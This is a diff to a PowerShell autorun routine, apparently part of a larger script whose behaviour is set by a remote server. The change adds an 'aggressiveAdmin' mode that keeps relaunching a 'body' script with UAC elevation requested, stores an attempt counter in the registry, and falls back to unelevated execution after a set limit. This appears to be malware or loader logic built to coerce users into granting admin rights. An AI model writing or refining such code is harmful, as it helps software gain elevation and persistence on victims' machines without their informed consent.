@@ -6,28 +6,30 @@ function do_autorun()
 {
     if ($server.aggressiveAdmin)
     {
+        $limit = $server.aggressiveAdminTimes
+        $times = RegReadParamInt -keyName "aggressiveAdminTimes"
         $elevated = IsElevated
-        if ($elevated -and 1 -eq 0)
+        if ($elevated)
         {
             RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
+
+            $times = $times + 1
+            RegWriteParamInt -keyName "aggressiveAdminTimes" -value $times
         } 
         else 
         {
-            # $attempt = $server.aggressiveAdminAttempts
-            # while ($attempt -gt 0) {
-            #     writedbg "attempt is $attempt"
-            #     $attempt = $attempt -1
-            #     try 
-            #     {
-            #         throw "fake error"
-            #         RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $true
-            #         break
-            #     }
-            #     catch {
-            #         writedbg "Force elevate: $attempt, sleeping: ${server.aggressiveAdminDelay}, $_"
-            #         Start-Sleep $server.aggressiveAdminDelay
-            #     }
-            # }
+            if ($limit -gt 0)
+            {
+                writedbg "times= $times,aggressiveAdminTimes= $limit"
+                if ($times -gt $limit)
+                {
+                    writedbg "no more times $times, running non elevated"
+                    Start-Sleep -Seconds 4
+                    RunMe -script (Get-BodyPath) -repassArgs $false -argName "" -argValue "" -uac $false
+                    return
+                }
+            }
+
             $attempt = GetArgInt("attempt")
             $attempt = $attempt + 1
             $sleep = $server.aggressiveAdminDelay
